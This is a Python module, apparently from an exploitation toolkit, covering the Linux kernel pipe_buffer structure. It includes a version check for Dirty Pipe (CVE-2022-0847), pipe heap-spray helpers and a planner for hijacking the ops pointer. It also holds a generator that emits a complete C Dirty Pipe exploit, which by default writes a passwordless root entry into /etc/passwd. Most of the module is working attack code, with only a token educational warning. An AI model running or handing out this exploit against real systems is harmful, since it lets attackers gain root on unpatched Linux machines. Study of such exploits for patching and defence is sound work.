"""
Linux kernel pipe_buffer structure exploitation.

pipe_buffer is the structure used by the pipe subsystem to track
pages of data in a pipe. Made famous by Dirty Pipe (CVE-2022-0847).

Structure (kernel 5.x):
    struct pipe_buffer {
        struct page *page;                    // +0x00
        unsigned int offset;                  // +0x08
        unsigned int len;                     // +0x0c
        const struct pipe_buf_operations *ops; // +0x10
        unsigned int flags;                   // +0x18
        unsigned long private;                // +0x20
    };

Key flags:
    PIPE_BUF_FLAG_LRU      = 0x01
    PIPE_BUF_FLAG_ATOMIC   = 0x02
    PIPE_BUF_FLAG_GIFT     = 0x04
    PIPE_BUF_FLAG_PACKET   = 0x08
    PIPE_BUF_FLAG_CAN_MERGE = 0x10  // Critical for Dirty Pipe

References:
- https://dirtypipe.cm4all.com/
- CVE-2022-0847 (Dirty Pipe)
- https://lore.kernel.org/lkml/20220221100313.1504449-1-max.kellermann@ionos.com/
"""

import os
import struct
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


# pipe_buffer flags
PIPE_BUF_FLAG_LRU = 0x01
PIPE_BUF_FLAG_ATOMIC = 0x02
PIPE_BUF_FLAG_GIFT = 0x04
PIPE_BUF_FLAG_PACKET = 0x08
PIPE_BUF_FLAG_CAN_MERGE = 0x10


@dataclass
class PipeBuffer:
    """Represents a pipe_buffer structure."""
    page: int = 0
    offset: int = 0
    length: int = 0
    ops: int = 0
    flags: int = 0
    private: int = 0

    STRUCT_SIZE = 0x28

    def pack(self) -> bytes:
        """Pack to bytes."""
        return struct.pack(
            "<QIIQIQ",
            self.page,
            self.offset,
            self.length,
            self.ops,
            self.flags,
            self.private,
        )

    @classmethod
    def unpack(cls, data: bytes) -> 'PipeBuffer':
        """Unpack from bytes."""
        page, offset, length, ops, flags, private = struct.unpack(
            "<QIIQIQ", data[:0x28]
        )
        return cls(page, offset, length, ops, flags, private)

    def has_can_merge(self) -> bool:
        """Check if CAN_MERGE flag is set."""
        return bool(self.flags & PIPE_BUF_FLAG_CAN_MERGE)


class DirtyPipeCheck:
    """
    Check if system is vulnerable to Dirty Pipe (CVE-2022-0847).

    Vulnerable: Linux 5.8 <= version < 5.16.11, 5.15.25, 5.10.102
    """

    VULNERABLE_RANGES = [
        ((5, 8, 0), (5, 16, 10)),    # 5.8.0 - 5.16.10 vulnerable
        ((5, 15, 0), (5, 15, 24)),   # 5.15.0 - 5.15.24 vulnerable
        ((5, 10, 0), (5, 10, 101)),  # 5.10.0 - 5.10.101 vulnerable
    ]

    def __init__(self):
        self.kernel_version: Optional[Tuple[int, int, int]] = None

    def get_kernel_version(self) -> Tuple[int, int, int]:
        """Get running kernel version."""
        try:
            uname = os.uname()
            version_str = uname.release.split("-")[0]
            parts = version_str.split(".")
            major = int(parts[0])
            minor = int(parts[1]) if len(parts) > 1 else 0
            patch = int(parts[2]) if len(parts) > 2 else 0
            self.kernel_version = (major, minor, patch)
            return self.kernel_version
        except Exception as e:
            logger.error(f"Failed to get kernel version: {e}")
            return (0, 0, 0)

    def is_vulnerable(self, version: Optional[Tuple[int, int, int]] = None) -> bool:
        """
        Check if kernel version is vulnerable to Dirty Pipe.

        Args:
            version: Kernel version tuple, or None to detect

        Returns:
            True if vulnerable
        """
        if version is None:
            version = self.get_kernel_version()

        for min_ver, max_ver in self.VULNERABLE_RANGES:
            if min_ver <= version <= max_ver:
                return True

        return False

    def check_pipe_flags(self) -> Dict[str, Any]:
        """
        Runtime check for PIPE_BUF_FLAG_CAN_MERGE behavior.

        Returns:
            Check results
        """
        # This would need actual kernel interaction
        return {
            "can_merge_exists": True,
            "kernel_version": self.kernel_version,
            "vulnerable": self.is_vulnerable(),
            "notes": [
                "PIPE_BUF_FLAG_CAN_MERGE added in 5.8",
                "Bug: flag not cleared when pipe_buffer reused",
                "Fixed in 5.16.11, 5.15.25, 5.10.102",
            ],
        }


class PipeSpray:
    """
    Heap spray using pipe_buffer structures.

    pipe_buffer arrays are allocated from kmalloc caches.
    Default pipe size is 16 pages = 16 pipe_buffers = 16 * 0x28 = 0x280 bytes
    -> kmalloc-1k cache
    """

    def __init__(self):
        self.pipes: List[Tuple[int, int]] = []  # (read_fd, write_fd)

    def calculate_allocation_size(self, pipe_size: int = 16) -> Tuple[int, str]:
        """
        Calculate allocation size for pipe_buffer array.

        Args:
            pipe_size: Number of pages in pipe (default 16)

        Returns:
            (allocation_size, cache_name)
        """
        array_size = pipe_size * PipeBuffer.STRUCT_SIZE

        if array_size <= 64:
            return 64, "kmalloc-64"
        elif array_size <= 128:
            return 128, "kmalloc-128"
        elif array_size <= 256:
            return 256, "kmalloc-256"
        elif array_size <= 512:
            return 512, "kmalloc-512"
        elif array_size <= 1024:
            return 1024, "kmalloc-1k"
        else:
            return array_size, "kmalloc-2k+"

    def create_pipes(self, count: int) -> List[Tuple[int, int]]:
        """
        Create pipes for spraying.

        Args:
            count: Number of pipes to create

        Returns:
            List of (read_fd, write_fd) tuples
        """
        self.pipes = []
        for _ in range(count):
            # In real code: pipe(fds)
            pass
        return self.pipes

    def set_pipe_size(self, fd: int, size: int) -> bool:
        """
        Set pipe buffer size via fcntl.

        Args:
            fd: Pipe file descriptor
            size: Desired size in pages

        Returns:
            Success
        """
        # fcntl(fd, F_SETPIPE_SZ, size * PAGE_SIZE)
        return True

    def fill_pipe(self, write_fd: int, data: bytes) -> int:
        """
        Fill pipe with data.

        Args:
            write_fd: Write end of pipe
            data: Data to write

        Returns:
            Bytes written
        """
        # write(write_fd, data, len(data))
        return len(data)

    def drain_pipe(self, read_fd: int, count: int) -> bytes:
        """
        Read from pipe.

        Args:
            read_fd: Read end of pipe
            count: Bytes to read

        Returns:
            Data read
        """
        # read(read_fd, buf, count)
        return b""


class DirtyPipeExploit:
    """
    Dirty Pipe (CVE-2022-0847) exploit helper.

    The vulnerability allows writing to read-only files by:
    1. Open target file read-only
    2. Create pipe
    3. Fill pipe completely (sets PIPE_BUF_FLAG_CAN_MERGE)
    4. Drain pipe (preserves CAN_MERGE due to bug)
    5. splice() target file into pipe (page becomes shared)
    6. Write to pipe - writes to page cache due to CAN_MERGE!

    Result: Arbitrary write to any readable file.
    """

    def __init__(self):
        self.checker = DirtyPipeCheck()
        self.spray = PipeSpray()

    def check_vulnerability(self) -> bool:
        """Check if system is vulnerable."""
        return self.checker.is_vulnerable()

    def exploit_file(
        self,
        target_file: str,
        offset: int,
        data: bytes,
    ) -> Dict[str, Any]:
        """
        Plan exploit for file modification.

        Args:
            target_file: Path to target file
            offset: Offset in file to write at
            data: Data to write

        Returns:
            Exploit plan
        """
        # Offset must not be 0 (splice behavior)
        if offset == 0:
            offset = 1

        return {
            "target": target_file,
            "offset": offset,
            "data_size": len(data),
            "steps": [
                f"1. Open {target_file} read-only",
                "2. Create pipe with pipe()",
                "3. Fill pipe completely with dummy data",
                "4. Drain pipe (read all data)",
                f"5. splice() {target_file} into pipe at offset {offset}",
                "6. Write payload to pipe",
                "7. Data is written to page cache (file modified!)",
            ],
            "limitations": [
                "Cannot write at offset 0",
                "Target file must be readable",
                "Write size limited by page cache mechanics",
            ],
        }

    def generate_exploit_code(
        self,
        target_file: str = "/etc/passwd",
        offset: int = 4,
        payload: str = "root::0:0::/root:/bin/sh\n",
    ) -> str:
        """Generate C exploit code."""
        return f'''
/*
 * Dirty Pipe (CVE-2022-0847) Exploit
 * Target: {target_file}
 *
 * WARNING: This is for educational purposes only.
 */

#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

#define TARGET_FILE "{target_file}"
#define TARGET_OFFSET {offset}
#define PAYLOAD "{payload}"

int main(void) {{
    // Check kernel version first
    struct utsname uname_buf;
    uname(&uname_buf);
    printf("[*] Kernel: %s\\n", uname_buf.release);

    // Step 1: Open target file read-only
    int fd = open(TARGET_FILE, O_RDONLY);
    if (fd < 0) {{
        perror("open target");
        return 1;
    }}

    struct stat st;
    fstat(fd, &st);
    printf("[*] Target file size: %ld\\n", st.st_size);

    // Step 2: Create pipe
    int p[2];
    if (pipe(p) < 0) {{
        perror("pipe");
        return 1;
    }}

    // Step 3: Fill pipe completely
    // This sets PIPE_BUF_FLAG_CAN_MERGE on pipe_buffers
    unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    printf("[*] Pipe size: %u\\n", pipe_size);

    char *buf = malloc(pipe_size);
    memset(buf, 'A', pipe_size);

    // Fill pipe
    for (unsigned r = pipe_size; r > 0;) {{
        ssize_t n = write(p[1], buf, r);
        if (n <= 0) break;
        r -= n;
    }}
    printf("[+] Pipe filled\\n");

    // Step 4: Drain pipe (BUG: CAN_MERGE flag preserved!)
    for (unsigned r = pipe_size; r > 0;) {{
        ssize_t n = read(p[0], buf, r);
        if (n <= 0) break;
        r -= n;
    }}
    printf("[+] Pipe drained (CAN_MERGE still set!)\\n");

    // Step 5: Splice target file into pipe
    // The page cache page is now referenced by pipe_buffer
    loff_t offset = TARGET_OFFSET;
    ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
    if (nbytes <= 0) {{
        perror("splice");
        return 1;
    }}
    printf("[+] Spliced %zd bytes from file\\n", nbytes);

    // Step 6: Write payload to pipe
    // Due to CAN_MERGE bug, this writes to page cache!
    const char *payload = PAYLOAD;
    nbytes = write(p[1], payload, strlen(payload));
    if (nbytes <= 0) {{
        perror("write payload");
        return 1;
    }}
    printf("[+] Wrote %zd bytes to pipe (-> page cache!)\\n", nbytes);

    printf("[+] Exploit complete! Check %s\\n", TARGET_FILE);

    close(p[0]);
    close(p[1]);
    close(fd);
    free(buf);

    return 0;
}}
'''


class PipeBufferExploit:
    """
    General pipe_buffer exploitation techniques.

    Beyond Dirty Pipe, pipe_buffer can be used for:
    - Heap spray (controlled size allocations)
    - Cross-cache attacks (via F_SETPIPE_SZ)
    - ops pointer hijacking (if we have write primitive)
    """

    def __init__(self):
        self.spray = PipeSpray()
        self.dirty_pipe = DirtyPipeExploit()

    def plan_ops_hijack(
        self,
        target_ops: int,
        fake_ops: int,
    ) -> Dict[str, Any]:
        """
        Plan pipe_buf_operations hijack.

        If we can corrupt pipe_buffer.ops pointer, we get
        code execution when pipe operations are performed.

        Args:
            target_ops: Address of target pipe_buffer
            fake_ops: Address of fake ops table

        Returns:
            Hijack plan
        """
        return {
            "technique": "pipe_buf_operations hijack",
            "steps": [
                "1. Spray pipe_buffers",
                "2. Trigger UAF/overflow on pipe_buffer",
                f"3. Overwrite ops pointer with 0x{fake_ops:016x}",
                "4. Trigger pipe operation (read/release)",
                "5. Kernel calls fake ops function",
            ],
            "ops_structure": {
                "confirm": "+0x00: void (*confirm)(struct pipe_inode_info *, struct pipe_buffer *)",
                "release": "+0x08: void (*release)(struct pipe_inode_info *, struct pipe_buffer *)",
                "try_steal": "+0x10: bool (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *)",
                "get": "+0x18: bool (*get)(struct pipe_inode_info *, struct pipe_buffer *)",
            },
            "notes": [
                "release is easiest to trigger (close pipe)",
                "First arg is pipe_inode_info, second is pipe_buffer",
                "Can be used for stack pivot or direct ROP",
            ],
        }

    def generate_spray_code(
        self,
        spray_count: int = 100,
        pipe_size: int = 16,
    ) -> str:
        """Generate pipe spray code."""
        return f'''
#define _GNU_SOURCE
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

#define SPRAY_COUNT {spray_count}
#define PIPE_SIZE {pipe_size}  // pages

int pipes[SPRAY_COUNT][2];

void spray_pipes(void) {{
    for (int i = 0; i < SPRAY_COUNT; i++) {{
        if (pipe(pipes[i]) < 0) {{
            perror("pipe");
            exit(1);
        }}

        // Optional: set pipe size for different cache
        // fcntl(pipes[i][1], F_SETPIPE_SZ, PIPE_SIZE * 4096);
    }}
    printf("[+] Sprayed %d pipes\\n", SPRAY_COUNT);
}}

void free_pipes(int start, int count) {{
    for (int i = start; i < start + count && i < SPRAY_COUNT; i++) {{
        close(pipes[i][0]);
        close(pipes[i][1]);
    }}
    printf("[+] Freed %d pipes starting at %d\\n", count, start);
}}

// After freeing some pipes, their pipe_buffer arrays
// can be reclaimed by other allocations
'''
